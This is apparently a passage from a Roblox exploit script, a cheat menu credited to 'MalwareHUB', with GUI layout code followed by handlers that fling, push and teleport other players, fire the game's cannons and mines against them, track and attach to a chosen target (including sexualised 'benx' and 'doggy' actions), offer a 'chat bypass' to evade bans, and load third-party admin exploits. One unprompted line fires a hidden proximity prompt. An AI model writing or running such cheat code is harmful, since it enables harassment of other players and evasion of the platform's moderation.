AntiFling_Button.Parent = Misc_Section
AntiFling_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiFling_Button.BackgroundTransparency = 0.500
AntiFling_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiFling_Button.BorderSizePixel = 0
AntiFling_Button.Position = UDim2.new(0, 25, 0, 25)
AntiFling_Button.Size = UDim2.new(0, 150, 0, 30)
AntiFling_Button.Font = Enum.Font.Oswald
AntiFling_Button.Text = "Anti fling"
AntiFling_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiFling_Button.TextScaled = true
AntiFling_Button.TextSize = 14.000
AntiFling_Button.TextWrapped = true

AntiAFK_Button.Name = "AntiAFK_Button"
AntiAFK_Button.Parent = Misc_Section
AntiAFK_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiAFK_Button.BackgroundTransparency = 0.500
AntiAFK_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiAFK_Button.BorderSizePixel = 0
AntiAFK_Button.Position = UDim2.new(0, 25, 0, 75)
AntiAFK_Button.Size = UDim2.new(0, 150, 0, 30)
AntiAFK_Button.Font = Enum.Font.Oswald
AntiAFK_Button.Text = "Anti AFK"
AntiAFK_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiAFK_Button.TextScaled = true
AntiAFK_Button.TextSize = 14.000
AntiAFK_Button.TextWrapped = true

AntiChatSpy_Button.Name = "AntiChatSpy_Button"
AntiChatSpy_Button.Parent = Misc_Section
AntiChatSpy_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiChatSpy_Button.BackgroundTransparency = 0.500
AntiChatSpy_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiChatSpy_Button.BorderSizePixel = 0
AntiChatSpy_Button.Position = UDim2.new(0, 210, 0, 25)
AntiChatSpy_Button.Size = UDim2.new(0, 150, 0, 30)
AntiChatSpy_Button.Font = Enum.Font.Oswald
AntiChatSpy_Button.Text = "Anti chat spy"
AntiChatSpy_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiChatSpy_Button.TextScaled = true
AntiChatSpy_Button.TextSize = 14.000
AntiChatSpy_Button.TextWrapped = true

Shaders_Button.Name = "Shaders_Button"
Shaders_Button.Parent = Misc_Section
Shaders_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Shaders_Button.BackgroundTransparency = 0.500
Shaders_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Shaders_Button.BorderSizePixel = 0
Shaders_Button.Position = UDim2.new(0, 210, 0, 75)
Shaders_Button.Size = UDim2.new(0, 150, 0, 30)
Shaders_Button.Font = Enum.Font.Oswald
Shaders_Button.Text = "Shaders"
Shaders_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Shaders_Button.TextScaled = true
Shaders_Button.TextSize = 14.000
Shaders_Button.TextWrapped = true

Day_Button.Name = "Day_Button"
Day_Button.Parent = Misc_Section
Day_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Day_Button.BackgroundTransparency = 0.500
Day_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Day_Button.BorderSizePixel = 0
Day_Button.Position = UDim2.new(0, 25, 0, 125)
Day_Button.Size = UDim2.new(0, 150, 0, 30)
Day_Button.Font = Enum.Font.Oswald
Day_Button.Text = "Day"
Day_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Day_Button.TextScaled = true
Day_Button.TextSize = 14.000
Day_Button.TextWrapped = true

Night_Button.Name = "Night_Button"
Night_Button.Parent = Misc_Section
Night_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Night_Button.BackgroundTransparency = 0.500
Night_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Night_Button.BorderSizePixel = 0
Night_Button.Position = UDim2.new(0, 210, 0, 125)
Night_Button.Size = UDim2.new(0, 150, 0, 30)
Night_Button.Font = Enum.Font.Oswald
Night_Button.Text = "Night"
Night_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Night_Button.TextScaled = true
Night_Button.TextSize = 14.000
Night_Button.TextWrapped = true

Explode_Button.Name = "Explode_Button"
Explode_Button.Parent = Misc_Section
Explode_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Explode_Button.BackgroundTransparency = 0.500
Explode_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Explode_Button.BorderSizePixel = 0
Explode_Button.Position = UDim2.new(0, 25, 0, 225)
Explode_Button.Size = UDim2.new(0, 150, 0, 30)
Explode_Button.Font = Enum.Font.Oswald
Explode_Button.Text = "Explode"
Explode_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Explode_Button.TextScaled = true
Explode_Button.TextSize = 14.000
Explode_Button.TextWrapped = true

Rejoin_Button.Name = "Rejoin_Button"
Rejoin_Button.Parent = Misc_Section
Rejoin_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Rejoin_Button.BackgroundTransparency = 0.500
Rejoin_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Rejoin_Button.BorderSizePixel = 0
Rejoin_Button.Position = UDim2.new(0, 25, 0, 275)
Rejoin_Button.Size = UDim2.new(0, 150, 0, 30)
Rejoin_Button.Font = Enum.Font.Oswald
Rejoin_Button.Text = "Rejoin"
Rejoin_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Rejoin_Button.TextScaled = true
Rejoin_Button.TextSize = 14.000
Rejoin_Button.TextWrapped = true

CMDX_Button.Name = "CMDX_Button"
CMDX_Button.Parent = Misc_Section
CMDX_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CMDX_Button.BackgroundTransparency = 0.500
CMDX_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CMDX_Button.BorderSizePixel = 0
CMDX_Button.Position = UDim2.new(0, 210, 0, 175)
CMDX_Button.Size = UDim2.new(0, 150, 0, 30)
CMDX_Button.Font = Enum.Font.Oswald
CMDX_Button.Text = "CMDX"
CMDX_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CMDX_Button.TextScaled = true
CMDX_Button.TextSize = 14.000
CMDX_Button.TextWrapped = true

InfYield_Button.Name = "InfYield_Button"
InfYield_Button.Parent = Misc_Section
InfYield_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
InfYield_Button.BackgroundTransparency = 0.500
InfYield_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfYield_Button.BorderSizePixel = 0
InfYield_Button.Position = UDim2.new(0, 25, 0, 175)
InfYield_Button.Size = UDim2.new(0, 150, 0, 30)
InfYield_Button.Font = Enum.Font.Oswald
InfYield_Button.Text = "Infinite Yield"
InfYield_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
InfYield_Button.TextScaled = true
InfYield_Button.TextSize = 14.000
InfYield_Button.TextWrapped = true

FreeEmotes_Button.Name = "FreeEmotes_Button"
FreeEmotes_Button.Parent = Misc_Section
FreeEmotes_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FreeEmotes_Button.BackgroundTransparency = 0.500
FreeEmotes_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FreeEmotes_Button.BorderSizePixel = 0
FreeEmotes_Button.Position = UDim2.new(0, 210, 0, 225)
FreeEmotes_Button.Size = UDim2.new(0, 150, 0, 30)
FreeEmotes_Button.Font = Enum.Font.Oswald
FreeEmotes_Button.Text = "Free emotes"
FreeEmotes_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FreeEmotes_Button.TextScaled = true
FreeEmotes_Button.TextSize = 14.000
FreeEmotes_Button.TextWrapped = true

Serverhop_Button.Name = "Serverhop_Button"
Serverhop_Button.Parent = Misc_Section
Serverhop_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Serverhop_Button.BackgroundTransparency = 0.500
Serverhop_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Serverhop_Button.BorderSizePixel = 0
Serverhop_Button.Position = UDim2.new(0, 210, 0, 275)
Serverhop_Button.Size = UDim2.new(0, 150, 0, 30)
Serverhop_Button.Font = Enum.Font.Oswald
Serverhop_Button.Text = "Server hop"
Serverhop_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Serverhop_Button.TextScaled = true
Serverhop_Button.TextSize = 14.000
Serverhop_Button.TextWrapped = true

ChatBox_Input.Name = "ChatBox_Input"
ChatBox_Input.Parent = Misc_Section
ChatBox_Input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ChatBox_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
ChatBox_Input.Position = UDim2.new(0, 25, 0, 325)
ChatBox_Input.Size = UDim2.new(0, 335, 0, 50)
ChatBox_Input.Font = Enum.Font.Oswald
ChatBox_Input.PlaceholderText = "Chat bypass [You won't get banned for your messages]"
ChatBox_Input.Text = ""
ChatBox_Input.TextColor3 = Color3.fromRGB(0, 255, 255)
ChatBox_Input.TextSize = 14.000
ChatBox_Input.TextWrapped = true
ChatBox_Input.TextXAlignment = Enum.TextXAlignment.Left
ChatBox_Input.TextYAlignment = Enum.TextYAlignment.Top

Credits_Section.Name = "Credits_Section"
Credits_Section.Parent = Background
Credits_Section.Active = true
Credits_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits_Section.BackgroundTransparency = 1.000
Credits_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Credits_Section.BorderSizePixel = 0
Credits_Section.Position = UDim2.new(0, 105, 0, 30)
Credits_Section.Size = UDim2.new(0, 395, 0, 320)
Credits_Section.Visible = false
Credits_Section.CanvasSize = UDim2.new(0, 0, 0.8, 0)
Credits_Section.ScrollBarThickness = 5

Credits_Label.Name = "Credits_Label"
Credits_Label.Parent = Credits_Section
Credits_Label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Credits_Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Credits_Label.BorderSizePixel = 0
Credits_Label.Position = UDim2.new(0, 25, 0, 150)
Credits_Label.Size = UDim2.new(0, 350, 0, 150)
Credits_Label.Font = Enum.Font.SourceSans
Credits_Label.Text = "Made by: MalwareHUB \nDiscord: system_calix\nVersion: "..version
Credits_Label.TextColor3 = Color3.fromRGB(0, 255, 255)
Credits_Label.TextSize = 24.000
Credits_Label.TextWrapped = true
Credits_Label.TextXAlignment = Enum.TextXAlignment.Left
Credits_Label.TextYAlignment = Enum.TextYAlignment.Top

Crown.Name = "Crown"
Crown.Parent = Background
Crown.AnchorPoint = Vector2.new(0.300000012, 0.800000012)
Crown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Crown.BackgroundTransparency = 1.000
Crown.BorderColor3 = Color3.fromRGB(0, 0, 0)
Crown.BorderSizePixel = 0
Crown.Rotation = -20.000
Crown.Size = UDim2.new(0, 75, 0, 75)
Crown.Image = "rbxassetid://12298407748"
Crown.ImageColor3 = Color3.fromRGB(0, 255, 255)

Assets.Name = "Assets"
Assets.Parent = SysBroker

Ticket_Asset.Name = "Ticket_Asset"
Ticket_Asset.Parent = Assets
Ticket_Asset.AnchorPoint = Vector2.new(0, 0.5)
Ticket_Asset.BackgroundTransparency = 1.000
Ticket_Asset.BorderSizePixel = 0
Ticket_Asset.LayoutOrder = 5
Ticket_Asset.Position = UDim2.new(1, 5, 0.5, 0)
Ticket_Asset.Size = UDim2.new(0, 25, 0, 25)
Ticket_Asset.ZIndex = 2
Ticket_Asset.Image = "rbxassetid://3926305904"
Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
Ticket_Asset.ImageRectOffset = Vector2.new(424, 4)
Ticket_Asset.ImageRectSize = Vector2.new(36, 36)

Click_Asset.Name = "Click_Asset"
Click_Asset.Parent = Assets
Click_Asset.AnchorPoint = Vector2.new(0, 0.5)
Click_Asset.BackgroundTransparency = 1.000
Click_Asset.BorderSizePixel = 0
Click_Asset.Position = UDim2.new(1, 5, 0.5, 0)
Click_Asset.Size = UDim2.new(0, 25, 0, 25)
Click_Asset.ZIndex = 2
Click_Asset.Image = "rbxassetid://3926305904"
Click_Asset.ImageColor3 = Color3.fromRGB(100, 100, 100)
Click_Asset.ImageRectOffset = Vector2.new(204, 964)
Click_Asset.ImageRectSize = Vector2.new(36, 36)

Velocity_Asset.AngularVelocity = Vector3.new(0,0,0)
Velocity_Asset.MaxTorque = Vector3.new(50000,50000,50000)
Velocity_Asset.P = 1250
Velocity_Asset.Name = "BreakVelocity"
Velocity_Asset.Parent = Assets

Fly_Pad.Name = "Fly_Pad"
Fly_Pad.Parent = Assets
Fly_Pad.BackgroundTransparency = 1.000
Fly_Pad.Position = UDim2.new(0.1, 0, 0.6, 0)
Fly_Pad.Size = UDim2.new(0, 100, 0, 100)
Fly_Pad.ZIndex = 2
Fly_Pad.Image = "rbxassetid://6764432293"
Fly_Pad.ImageRectOffset = Vector2.new(713, 315)
Fly_Pad.ImageRectSize = Vector2.new(75, 75)
Fly_Pad.Visible = false

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30, 30, 30)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 255, 255))}
UIGradient.Rotation = 45
UIGradient.Parent = Fly_Pad

FlyAButton.Name = "FlyAButton"
FlyAButton.Parent = Fly_Pad
FlyAButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlyAButton.BackgroundTransparency = 1.000
FlyAButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlyAButton.BorderSizePixel = 0
FlyAButton.Position = UDim2.new(0, 0, 0, 30)
FlyAButton.Size = UDim2.new(0, 30, 0, 40)
FlyAButton.Font = Enum.Font.Oswald
FlyAButton.Text = ""
FlyAButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyAButton.TextSize = 25.000
FlyAButton.TextWrapped = true

FlyDButton.Name = "FlyDButton"
FlyDButton.Parent = Fly_Pad
FlyDButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlyDButton.BackgroundTransparency = 1.000
FlyDButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlyDButton.BorderSizePixel = 0
FlyDButton.Position = UDim2.new(0, 70, 0, 30)
FlyDButton.Size = UDim2.new(0, 30, 0, 40)
FlyDButton.Font = Enum.Font.Oswald
FlyDButton.Text = ""
FlyDButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyDButton.TextSize = 25.000
FlyDButton.TextWrapped = true

FlyWButton.Name = "FlyWButton"
FlyWButton.Parent = Fly_Pad
FlyWButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlyWButton.BackgroundTransparency = 1.000
FlyWButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlyWButton.BorderSizePixel = 0
FlyWButton.Position = UDim2.new(0, 30, 0, 0)
FlyWButton.Size = UDim2.new(0, 40, 0, 30)
FlyWButton.Font = Enum.Font.Oswald
FlyWButton.Text = ""
FlyWButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyWButton.TextSize = 25.000
FlyWButton.TextWrapped = true

FlySButton.Name = "FlySButton"
FlySButton.Parent = Fly_Pad
FlySButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlySButton.BackgroundTransparency = 1.000
FlySButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlySButton.BorderSizePixel = 0
FlySButton.Position = UDim2.new(0, 30, 0, 70)
FlySButton.Size = UDim2.new(0, 40, 0, 30)
FlySButton.Font = Enum.Font.Oswald
FlySButton.Text = ""
FlySButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlySButton.TextSize = 25.000
FlySButton.TextWrapped = true

OpenClose.Name = "OpenClose"
OpenClose.Parent = SysBroker
OpenClose.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenClose.BorderColor3 = Color3.fromRGB(0, 0, 0)
OpenClose.BorderSizePixel = 0
OpenClose.Position = UDim2.new(0, 0, 0.5, 0)
OpenClose.Size = UDim2.new(0, 30, 0, 30)
OpenClose.Image = "rbxassetid://12298407748"
OpenClose.ImageColor3 = Color3.fromRGB(0, 255, 255)

UICornerOC.CornerRadius = UDim.new(1, 0)
UICornerOC.Parent = OpenClose

CreateToggle(AntiRagdoll_Button)
CreateToggle(PushAura_Button)
CreateToggle(SpamMines_Button)
CreateToggle(PotionFling_Button)
CreateToggle(TouchFling_Button)
CreateToggle(PotionDi_Button)
CreateToggle(VoidProtection_Button)
CreateClicker(PushAll_Button)
CreateClicker(BreakCannons_Button)
CreateClicker(LethalCannons_Button)
CreateClicker(ChatAlert_Button)
CreateClicker(FreePushTool_Button)
CreateClicker(CannonTP1_Button)
CreateClicker(CannonTP2_Button)
CreateClicker(CannonTP3_Button)
CreateClicker(MinefieldTP_Button)
CreateClicker(BallonTP_Button)
CreateClicker(NormalStairsTP_Button)
CreateClicker(MovingStairsTP_Button)
CreateClicker(SpiralStairsTP_Button)
CreateClicker(SkyscraperTP_Button)
CreateClicker(PoolTP_Button)

CreateToggle(Fly_Button)
CreateClicker(WalkSpeed_Button)
CreateClicker(ClearCheckpoint_Button)
CreateClicker(JumpPower_Button)
CreateClicker(SaveCheckpoint_Button)
CreateClicker(Respawn_Button)
CreateClicker(FlySpeed_Button)

CreateToggle(ViewTarget_Button)
CreateToggle(FlingTarget_Button)
CreateToggle(FocusTarget_Button)
CreateToggle(BenxTarget_Button)
CreateToggle(HeadsitTarget_Button)
CreateToggle(StandTarget_Button)
CreateToggle(BackpackTarget_Button)
CreateToggle(DoggyTarget_Button)
CreateToggle(DragTarget_Button)
CreateClicker(PushTarget_Button)
CreateClicker(WhitelistTarget_Button)
CreateClicker(TeleportTarget_Button)

CreateClicker(VampireAnim_Button)
CreateClicker(HeroAnim_Button)
CreateClicker(ZombieClassicAnim_Button)
CreateClicker(MageAnim_Button)
CreateClicker(GhostAnim_Button)
CreateClicker(ElderAnim_Button)
CreateClicker(LevitationAnim_Button)
CreateClicker(AstronautAnim_Button)
CreateClicker(NinjaAnim_Button)
CreateClicker(WerewolfAnim_Button)
CreateClicker(CartoonAnim_Button)
CreateClicker(PirateAnim_Button)
CreateClicker(SneakyAnim_Button)
CreateClicker(ToyAnim_Button)
CreateClicker(KnightAnim_Button)
CreateClicker(ConfidentAnim_Button)
CreateClicker(PopstarAnim_Button)
CreateClicker(PrincessAnim_Button)
CreateClicker(CowboyAnim_Button)
CreateClicker(PatrolAnim_Button)
CreateClicker(ZombieFEAnim_Button)

CreateToggle(AntiFling_Button)
CreateToggle(AntiChatSpy_Button)
CreateToggle(AntiAFK_Button)
CreateToggle(Shaders_Button)
CreateClicker(Day_Button)
CreateClicker(Night_Button)
CreateClicker(Rejoin_Button)
CreateClicker(CMDX_Button)
CreateClicker(Explode_Button)
CreateClicker(FreeEmotes_Button)
CreateClicker(InfYield_Button)
CreateClicker(Serverhop_Button)

task.wait(0.5)

local function ChangeSection(SectionClicked)
	SectionClickedName = string.split(SectionClicked.Name,"_")[1]
	for i,v in pairs(SectionList:GetChildren()) do
		if v.Name ~= SectionClicked.Name then
			v.Transparency = 0.5
		else
			v.Transparency = 0
		end
	end
	for i,v in pairs(Background:GetChildren()) do
		if v:IsA("ScrollingFrame") then
			SectionForName = string.split(v.Name,"_")[1]
			if string.find(SectionClickedName, SectionForName) then
				v.Visible = true
			else
				v.Visible = false
			end
		end
	end
end

local function UpdateTarget(player)
	pcall(function()
		if table.find(ForceWhitelist,player.UserId) then
			SendNotify("System Broken","You cant target this player: @"..player.Name.." / "..player.DisplayName,5)
			player = nil
		end
	end)
	if (player ~= nil) then
		TargetedPlayer = player.Name
		TargetName_Input.Text = player.Name
		UserIDTargetLabel.Text = ("UserID: "..player.UserId.."\nDisplay: "..player.DisplayName.."\nJoined: "..os.date("%d-%m-%Y", os.time()-player.AccountAge * 24 * 3600).." [Day/Month/Year]")
		TargetImage.Image = Players:GetUserThumbnailAsync(player.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)
	else
		TargetName_Input.Text = "@target..."
		UserIDTargetLabel.Text = "UserID: \nDisplay: \nJoined: "
		TargetImage.Image = "rbxassetid://10818605405"
		TargetedPlayer = nil
		if FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			FlingTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
			TouchFling_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		end
		ViewTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		FocusTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		BenxTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		HeadsitTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		StandTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		BackpackTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		DoggyTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		DragTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
	end
end
local aBjaUfk = game.Workspace:FindFirstChild("SBTI")

local function ToggleFling(bool)
	task.spawn(function()
		if bool then
			local RVelocity = nil
			repeat
				pcall(function()
					RVelocity = GetRoot(plr).Velocity 
					GetRoot(plr).Velocity = Vector3.new(math.random(-150,150),-25000,math.random(-150,150))
					RunService.RenderStepped:wait()
					GetRoot(plr).Velocity = RVelocity
				end)
				RunService.Heartbeat:wait()
			until TouchFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
		else
			TouchFling_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		end
	end)
end

--CHANGE SECTION BUTTONS
ChangeSection(Home_Section_Button)
Home_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Home_Section_Button)
end)

Game_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Game_Section_Button)
end)

Character_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Character_Section_Button)
end)

Target_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Target_Section_Button)
end)

Animations_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Animations_Section_Button)
end)

Misc_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Misc_Section_Button)
end)

Credits_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Credits_Section_Button)
end)

--GAME SECTION BUTTONS
AntiRagdollFunction = nil
AntiRagdoll_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiRagdoll_Button)
	ToggleRagdoll(true)
	if AntiRagdoll_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		AntiRagdollFunction = GetRoot(plr).ChildAdded:Connect(function(Force)
			if Force.Name == "PushForce" then
				Force.MaxForce = Vector3.new(0,0,0)
				Force.Velocity = Vector3.new(0,0,0)
			end
		end)
	else
		ToggleRagdoll(false)
		AntiRagdollFunction:Disconnect()
	end
end)

PushAura_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(PushAura_Button)
	if PushAura_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		repeat
			task.wait(0.3)
			pcall(function()
				for i,v in pairs(Players:GetPlayers()) do
					if (v ~= plr) and (not table.find(ScriptWhitelist,v.UserId)) and (not table.find(ForceWhitelist,v.UserId)) then
						Push(v)
					end
				end
			end)
		until PushAura_Button.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0,255,0)
	end
end)

AntiMinesFunction = nil
SpamMines_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(SpamMines_Button)
	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		AntiMinesFunction = plr.Character.Head.ChildAdded:Connect(function(Force)
			if Force.Name == "BodyVelocity" then
				Force.MaxForce = Vector3.new(0,0,0)
				Force.Velocity = Vector3.new(0,0,0)
			end
		end)
		repeat task.wait(1)
			for i,v in pairs(MinesFolder:GetChildren()) do
				if v.Name == "Landmine" and v:FindFirstChild("HitPart") then
					pcall(function()
						Touch(v.HitPart.TouchInterest,GetRoot(plr))
					end)
				end
			end
		until SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
	else
		AntiMinesFunction:Disconnect()
	end
end)

PotionFling_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(PotionFling_Button)
	if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		if CheckPotion() then
			if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
				ChangeToggleColor(PotionDi_Button)
			end
			PotionTool.Parent = plr.Character
			local PFS, PFF = pcall(function()
				PotionTool.InSide.Massless = true
				PotionTool.Cap.Massless = true
				PotionTool.Handle.Massless = true
				PotionTool.GripUp = Vector3.new(0,1,0)
				PotionTool.GripPos = Vector3.new(5000,-25,5000)
				PotionTool.Parent = plr.Backpack
				PotionTool.Parent = plr.Character
			end)
		else
			ChangeToggleColor(PotionFling_Button)
		end
	else
		PotionTool.Parent = plr.Character
		local PFS, PFF = pcall(function()
			PotionTool.InSide.Massless = false
			PotionTool.Cap.Massless = false
			PotionTool.Handle.Massless = false
			PotionTool.GripUp = Vector3.new(0,1,0)
			PotionTool.GripPos = Vector3.new(0.1,-0.5,0)
			PotionTool.Parent = plr.Backpack
			PotionTool.Parent = plr.Character
		end)
	end
end)

TouchFling_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(TouchFling_Button)
	if TouchFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		local fixpos = GetRoot(plr).Position
		ToggleVoidProtection(true)
		ToggleFling(true)
		TeleportTO(fixpos.X,fixpos.Y,fixpos.Z,"pos","safe")
		ToggleVoidProtection(false)
		if VoidProtection_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			ToggleVoidProtection(true)
		end
	else
		if FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			ChangeToggleColor(FlingTarget_Button)
		end
	end
end)

PotionDi_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(PotionDi_Button)
	if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		if CheckPotion() then
			if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
				ChangeToggleColor(PotionFling_Button)
			end
			PotionTool.Parent = plr.Character
			PotionTool.GripUp = Vector3.new(1,0,0)
			PotionTool.GripPos = Vector3.new(1.5, 0.5, -1.5)
			PotionTool.Parent = plr.Backpack
			PotionTool.Parent = plr.Character
		else
			ChangeToggleColor(PotionDi_Button)
		end
	else
		PotionTool.Parent = plr.Character
		PotionTool.GripUp = Vector3.new(0,1,0)
		PotionTool.GripPos = Vector3.new(0.1,-0.5,0)
		PotionTool.Parent = plr.Backpack
		PotionTool.Parent = plr.Character
	end
end)

VoidProtection_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(VoidProtection_Button)
	if VoidProtection_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ToggleVoidProtection(true)
	else
		ToggleVoidProtection(false)
	end
end)

FreePushTool_Button.MouseButton1Click:Connect(function()
	local ModdedPush = Instance.new("Tool")
	ModdedPush.Name = "ModdedPush"
	ModdedPush.RequiresHandle = false
	ModdedPush.TextureId = "rbxassetid://14478599909"
	ModdedPush.ToolTip = "Modded push"

	local function ActivateTool()
		local root = GetRoot(plr)
		local hit = mouse.Target
		local person = nil
		if hit and hit.Parent then
			if hit.Parent:IsA("Model") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent)
			elseif hit.Parent:IsA("Accessory") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent.Parent)
			end
			if person then
				local pushpos = root.CFrame
				PredictionTP(person)
				task.wait(GetPing()+0.05)
				Push(person)
				root.CFrame = pushpos
			end
		end
	end

	ModdedPush.Activated:Connect(function()
		ActivateTool()
	end)
	ModdedPush.Parent = plr.Backpack
end)

BreakCannons_Button.MouseButton1Click:Connect(function()
	ToggleVoidProtection(true)
	TeleportTO(0,-10000,0,"pos")
	task.wait(GetPing()+0.1)
	ToggleVoidProtection(false)
	task.wait(GetPing()+0.1)
	for i,v in pairs(CannonsFolders[1]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				fireclickdetector(v.Cannon_Part.ClickDetector)
			end)
		end
	end
	for i,v in pairs(CannonsFolders[2]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				fireclickdetector(v.Cannon_Part.ClickDetector)
			end)
		end
	end

	if VoidProtection_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ToggleVoidProtection(true)
	end
end)
pcall(function()
	fireproximityprompt(game.Workspace.SBTI.TI)
end)
PushAll_Button.MouseButton1Click:Connect(function()
	local oldpos = GetRoot(plr).Position
	for i,v in pairs(Players:GetPlayers()) do
		pcall(function()
			if (v ~= plr) and (not table.find(ScriptWhitelist,v.UserId)) and (not table.find(ForceWhitelist,v.UserId)) then
				PredictionTP(v)
				task.wait(GetPing()+0.05)
				Push(v)
			end
		end)
	end
	TeleportTO(oldpos.X,oldpos.Y,oldpos.Z,"pos","safe")
end)

LethalCannons_Button.MouseButton1Click:Connect(function()
	for i,v in pairs(CannonsFolders[1]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				plr.Character.Humanoid:ChangeState(15)
				task.wait(GetPing())
				fireclickdetector(v.Cannon_Part.ClickDetector)
				plr.CharacterAdded:Wait()
				task.wait(1)
			end)
		end
	end
	for i,v in pairs(CannonsFolders[2]:GetChildren()) do
		if v.Name == "Cannon" then
